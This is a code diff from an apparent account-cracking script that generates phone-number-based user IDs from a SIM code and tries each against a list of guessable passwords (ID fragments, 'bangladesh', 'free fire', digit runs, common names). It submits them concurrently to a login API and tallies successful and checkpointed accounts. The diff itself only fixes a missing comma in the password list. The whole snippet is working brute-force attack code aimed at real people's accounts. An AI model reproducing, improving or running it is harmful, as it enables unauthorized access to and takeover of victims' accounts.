@@ -608,7 +608,7 @@ def ___bd2___():
         print(f'{xdxx} TOTAL UID {xdxx}{G} '+tl);print(f'{xdxx} SIM CODE  {xdxx}{G} '+code);print(f'{xxdx} FIRST ON{xxdx}|{xxdx}OFF AIRPLANE MODE');linex()
         for love in user:
             ids = code+love
-            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:]'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
+            if pasxd in ['1','01']:pwx = [ids,love,ids[:8],ids[:7],code+code,love[1:],ids[:6],love[2:],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
             elif pasxd in ['2','02']:pwx = [love[2:],love,code+love,code+love[:3],'bangladesh','free fire','i love you','708090','203040','506070','102030','113355','121234,@@@###','018@@','first12','890890','778899','nusrat','mabab','jannat']
             __bal__.submit(___API___,ids,pwx,tl)
     print('');linex();print(f'{xd} TOTAL OK {xdxx}{G} {str(len(oks))}');print(f'{xd} TOTAL CP {xdxx}{G} {str(len(cps))}');linex();exit()
